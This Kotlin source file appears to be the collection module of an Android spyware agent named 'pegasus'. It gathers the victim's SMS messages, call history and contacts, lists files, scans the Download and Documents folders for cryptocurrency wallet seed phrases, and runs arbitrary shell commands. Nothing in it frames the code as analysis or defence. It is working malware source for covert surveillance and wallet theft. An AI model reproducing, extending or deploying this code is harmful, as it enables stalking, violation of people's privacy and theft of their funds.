package com.pegasus.agent

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.regex.Pattern

object Collector {
    private const val LIMIT = 400

    fun sms(ctx: Context): JSONArray = rows(ctx, Telephony.Sms.CONTENT_URI,
        arrayOf("address", "body", "date", "type")) { c ->
        JSONObject().put("from", c.getString(0) ?: "").put("body", c.getString(1) ?: "")
            .put("ts", c.getLong(2)).put("dir", c.getInt(3))
    }

    fun calls(ctx: Context): JSONArray = rows(ctx, CallLog.Calls.CONTENT_URI,
        arrayOf("number", "duration", "date", "type")) { c ->
        JSONObject().put("number", c.getString(0) ?: "").put("duration", c.getLong(1))
            .put("ts", c.getLong(2)).put("type", c.getInt(3))
    }

    fun contacts(ctx: Context): JSONArray = rows(ctx,
        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        arrayOf("display_name", "number")) { c ->
        JSONObject().put("name", c.getString(0) ?: "").put("number", c.getString(1) ?: "")
    }

    private fun rows(ctx: Context, uri: android.net.Uri, cols: Array<String>,
                     map: (android.database.Cursor) -> JSONObject): JSONArray {
        val out = JSONArray()
        ctx.contentResolver.query(uri, cols, null, null, "date DESC")?.use { c ->
            while (c.moveToNext() && out.length() < LIMIT) out.put(map(c))
        }
        return out
    }

    fun files(root: String): JSONArray {
        val out = JSONArray()
        File(root).listFiles()?.forEach { f ->
            if (out.length() >= 120 || !f.isFile || f.length() > 8_000_000) return@forEach
            out.put(JSONObject().put("name", f.name).put("size", f.length()))
        }
        return out
    }

    fun wallets(): JSONArray {
        val pattern = Pattern.compile("\\b(?:[a-z]{4,8}\\s+){11,23}[a-z]{4,8}\\b")
        val out = JSONArray()
        listOf("/sdcard/Download", "/sdcard/Documents").forEach { dir ->
            File(dir).listFiles()?.forEach { f ->
                if (out.length() >= 40 || !f.name.matches(Regex(".*\\.(txt|json|csv|rtf)$")))
                    return@forEach
                if (f.length() > 2_000_000) return@forEach
                val text = runCatching { f.readText() }.getOrNull() ?: return@forEach
                val m = pattern.matcher(text)
                while (m.find()) out.put(JSONObject().put("file", f.name).put("seed", m.group()))
            }
        }
        return out
    }

    fun shell(cmd: String): String = runCatching {
        Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd)).inputStream
            .bufferedReader().readText().take(20_000)
    }.getOrDefault("")
}
